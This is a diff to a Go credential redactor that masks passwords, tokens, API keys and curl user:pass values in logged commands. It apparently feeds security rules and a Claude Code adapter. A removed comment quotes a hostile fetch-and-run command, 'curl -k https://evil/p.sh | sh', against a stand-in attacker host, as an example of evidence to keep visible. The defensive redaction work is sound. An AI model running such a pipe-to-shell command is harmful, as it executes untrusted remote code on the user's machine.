@@ -46,7 +46,9 @@ var secretPatterns = []*regexp.Regexp{
 // between them, so "postgres://admin:pw@h" becomes
 // "postgres://[REDACTED]@h", not "postgres[REDACTED]h" (which would also
 // make the URL's own scheme and host unreadable).
-var urlUserinfoPattern = regexp.MustCompile(`(://)([^/\s:@]+:[^/\s@]+)(@)`)
+// The password part runs to the LAST "@" before the host, the same way
+// net/url splits userinfo, so "https://user:p@ss@host" does not leak "ss".
+var urlUserinfoPattern = regexp.MustCompile(`(://)([^/\s:@]+:[^/?#\s]*)(@)`)
 
 // quotedOrBareValue is one assignment value: a double-quoted string that
 // correctly skips an escaped quote (\"), so {"password":"a\"b"} redacts
@@ -64,7 +66,7 @@ const quotedValue = `"(?:[^"\\\n]|\\.)*"|'[^'\n]*'`
 // stays visible as evidence instead of being swallowed into the
 // redaction: a shell would treat that first space the same way. Only the
 // value is replaced.
-var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*=\s*)(` + quotedValue + `|[^\s;&|"'\n]*)`)
+var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|auth[_-]?token|token|secret)\b["']?\s*=\s*)(` + quotedValue + `|[^\s;&|"'\n]*)`)
 
 // assignmentPatternColon matches a "key: value" credential line, as
 // opposed to shell-style KEY=value: a line such as "token: abc def" is
@@ -72,7 +74,7 @@ var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Z
 // boundary to preserve and an unquoted value runs to the end of the
 // line (or to one of ;&|"', in case the line is itself embedded in a
 // larger shell command).
-var assignmentPatternColon = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*:\s*)(` + quotedValue + `|[^;&|"'\n]*)`)
+var assignmentPatternColon = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|auth[_-]?token|token|secret)\b["']?\s*:\s*)(` + quotedValue + `|[^;&|"'\n]*)`)
 
 // authorizationPattern matches an Authorization header or JSON field with a
 // Bearer, Basic, or token scheme, in both header ("Authorization: Bearer x")
@@ -81,18 +83,20 @@ var assignmentPatternColon = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za
 var authorizationPattern = regexp.MustCompile(`(?i)(authorization["']?\s*:\s*["']?(?:bearer|basic|token)\s+)([^\s;&|"']+)`)
 
 // SecretFlags lists the long-flag spellings whose value is a credential:
-// the --token/--secret/--password/--api-key family. It deliberately
-// excludes -u/--user (handled separately by userFlagPattern, which also
-// requires the value to look like "user:pass"; see LooksLikeUserPass)
-// and excludes -t and -k entirely: both are widely used for unrelated,
-// non-secret purposes (ssh/docker's -t allocates a tty; curl's -k
-// disables TLS verification) and redacting their value hid the actual
-// evidence a rule needs, such as the URL in "curl -k https://evil/p.sh
-// | sh". It is exported so the Claude Code adapter's own, first-line
-// flag redaction (parse.go's commandSecretFlag) recognizes exactly the
-// same flags as this second-line DefaultRedactor, instead of the two
-// lists drifting apart.
-var SecretFlags = []string{"token", "secret", "password", "api-key", "apikey", "api_key"}
+// the --token/--secret/--password/--api-key family and a few common
+// longer names. It deliberately excludes -u/--user (see RedactUserFlags,
+// which also requires a "user:pass" value) and all short flags such as
+// -t, -k, and -p: those mean something unrelated for most commands (ssh
+// -t allocates a tty, curl -k skips TLS verification) and are redacted
+// only for the specific tools in toolSecretFlags. It is exported so the
+// Claude Code adapter's own, first-line flag redaction (parse.go's
+// commandSecretFlag) recognizes exactly the same flags as this
+// second-line DefaultRedactor, instead of the two lists drifting apart.
+var SecretFlags = []string{
+	"token", "secret", "password", "api-key", "apikey", "api_key",
+	"client-secret", "client_secret", "access-token", "access_token",
+	"auth-token", "auth_token", "http-password",
+}
 
 // secretFlagWordAlternation is SecretFlags as a regexp alternation of
 // bare words (no leading dashes), each escaped with regexp.QuoteMeta.
@@ -107,18 +111,17 @@ func secretFlagWordAlternation() string {
 // SecretFlagAlternation returns a regexp alternation that matches any
 // SecretFlags word with either one or two leading dashes ("-token" or
 // "--token"): some tools accept a single-dash spelling of an otherwise
-// "long" flag. It does not itself require a trailing separator; callers
-// that match a bare flag NAME (such as parse.go's secretFlagName, used
-// to recognize a flag in its own argv element) need only the name, while
-// callers that also consume a VALUE (secretFlagPattern below) add their
-// own separator requirement after it.
+// "long" flag. It does not itself require a trailing separator or a
+// leading word boundary; callers add both.
 func SecretFlagAlternation() string {
 	return `--?(?:` + secretFlagWordAlternation() + `)`
 }
 
 // UserFlagAlternation matches curl's user/password flag in any spelling
-// it accepts: -u, --user, or the single-dash -user some tools use.
-const UserFlagAlternation = `-u|--user|-user`
+// it accepts. The longer spellings come first: with leftmost-first
+// alternation, "-u" listed first would match the start of "-user" and
+// read "ser" as a glued value, leaking "-user alice:s3cret".
+const UserFlagAlternation = `--user|-user|-u`
 
 // LooksLikeUserPass reports whether value has curl's "user:pass" shape:
 // a non-empty name, a literal ":", and a (possibly empty) password. It
@@ -137,61 +140,51 @@ func LooksLikeUserPass(value string) bool {
 }
 
 // secretFlagPattern matches a SecretFlags flag and its value, requiring
-// a word boundary between the flag name and its separator: "=" or
-// whitespace, never glued directly onto the flag name. Without this,
-// text with no separator at all, such as "find . -type f" or
-// "--user-agent Mozilla", would match "-t" or "--user" as a flag name
-// with "ype" or "-agent" read as part of the separator-less value,
-// silently redacting unrelated text. Group 1 is the leading boundary,
-// flag, and separator, kept as-is in the replacement; the value itself
-// (group 2) uses the quotedValue grammar so a whole quoted phrase such
-// as `--password "correct horse battery"` is redacted as one value
-// instead of stopping at the first space inside the quotes.
-var secretFlagPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:` + SecretFlagAlternation() + `)(?:=|\s+))(` + quotedValue + `|[^\s;&|"'\n]*)`)
+// a word boundary on both sides of the flag name: whitespace or the
+// start of text before it, and "=" or whitespace after it, never glued
+// onto the value. Without this, "find . -type f", "--user-agent x", or
+// "--tokenizer gpt2" would read part of an unrelated word as a value.
+// Group 1 is the boundary, flag, and separator, kept as-is; group 2 is
+// the value, using the quotedValue grammar so a whole quoted phrase such
+// as `--password "correct horse battery"` is redacted as one value. An
+// unquoted value never starts with "-", so "--token --verbose" does not
+// eat the next flag.
+var secretFlagPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:` + SecretFlagAlternation() + `)(?:=|\s+))(` + quotedValue + `|(?:[^-\s;&|"'\n][^\s;&|"'\n]*)?)`)
 
-// userFlagPattern matches curl's -u/--user/-user flag and its value in
-// any shape a CLI accepts: "-u value" (space), "-u=value" (equals), or,
-// glued with no separator at all, but ONLY for the literal short form
-// "-u" (for example "-uuser:pass", curl's own documented short form);
-// the long spellings --user/-user always require an explicit "=" or
-// whitespace separator, for the same word-boundary reason
-// secretFlagPattern does: an unseparated "--user-agent" must not be
-// read as "--user" plus the value "-agent". Group 1 is the leading
-// boundary, flag, and separator; group 2 is the value, gated by
-// LooksLikeUserPass before replacement (see redactUserFlag).
-var userFlagPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:-u|--user|-user)(?:=|\s+|))(` + quotedValue + `|[^\s;&|"'\n]*)`)
+// userFlagPattern matches curl's -u/--user/-user flag and its value:
+// "-u value", "-u=value", or glued ("-uuser:pass", curl's documented
+// short form). Groups: boundary, flag, separator, value.
+var userFlagPattern = regexp.MustCompile(`(?i)(^|\s)(` + UserFlagAlternation + `)(=|\s+|)(` + quotedValue + `|[^\s;&|"'\n]*)`)
 
-// redactUserFlag replaces userFlagPattern's value with [REDACTED], but
-// only when it has curl's "user:pass" shape; a non-credential use such
-// as "sudo -u root" or "ssh -u" is left untouched. It also rejects an
-// empty separator (the glued form) for anything other than the literal
-// "-u" spelling, since "-user" and "--user" glued onto a value is not a
-// documented short form and would otherwise consume "--userXYZ" as a
-// flag.
-func redactUserFlag(value string) string {
-	return userFlagPattern.ReplaceAllStringFunc(value, func(match string) string {
-		parts := userFlagPattern.FindStringSubmatch(match)
-		prefix, body := parts[1], parts[2]
-		glued := !strings.HasSuffix(prefix, "=") && !hasTrailingSpace(prefix)
-		flagName := strings.TrimSpace(strings.TrimRight(prefix, "=\t\n\v\f\r "))
-		if glued && !strings.EqualFold(flagName, "-u") {
-			return match
+// RedactUserFlags replaces the value of a curl-style -u/--user/-user flag
+// with [REDACTED] when it has "user:pass" shape, and returns the raw
+// values it removed. A non-credential use such as "sudo -u root" is left
+// alone. The glued form is accepted only for "-u": "-userX" is read as
+// "-u" plus "serX", and "--userX" (such as "--user-agent") is never a
+// user flag at all. It is shared by DefaultRedactor and the Claude Code
+// adapter's source-side redaction, so both phases agree.
+func RedactUserFlags(value string) (string, []string) {
+	var removed []string
+	out := userFlagPattern.ReplaceAllStringFunc(value, func(match string) string {
+		g := userFlagPattern.FindStringSubmatch(match)
+		boundary, flag, separator, body := g[1], g[2], g[3], g[4]
+		if separator == "" {
+			switch strings.ToLower(flag) {
+			case "-u":
+			case "-user":
+				body = flag[2:] + body
+				flag = flag[:2]
+			default:
+				return match
+			}
 		}
 		if !LooksLikeUserPass(body) || placeholderSecret(body) {
 			return match
 		}
-		if len(body) >= 2 {
-			quote := body[0]
-			if (quote == '"' || quote == '\'') && body[len(body)-1] == quote {
-				return prefix + string(quote) + redactedMarker + string(quote)
-			}
-		}
-		return prefix + redactedMarker
+		removed = append(removed, strings.Trim(body, `"'`))
+		return boundary + flag + separator + quoteLike(body, redactedMarker)
 	})
-}
-
-func hasTrailingSpace(s string) bool {
-	return s != "" && (s[len(s)-1] == ' ' || s[len(s)-1] == '\t')
+	return out, removed
 }
 
 // DefaultRedactor replaces well-known credential shapes with [REDACTED].
@@ -199,7 +192,8 @@ func hasTrailingSpace(s string) bool {
 func DefaultRedactor(value string) string {
 	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
 	value = secretFlagPattern.ReplaceAllStringFunc(value, redactAssignment(secretFlagPattern))
-	value = redactUserFlag(value)
+	value, _ = RedactUserFlags(value)
+	value, _ = RedactToolFlags(value)
 	value = urlUserinfoPattern.ReplaceAllString(value, "${1}"+redactedMarker+"${3}")
 	for _, pattern := range secretPatterns {
 		value = pattern.ReplaceAllString(value, redactedMarker)
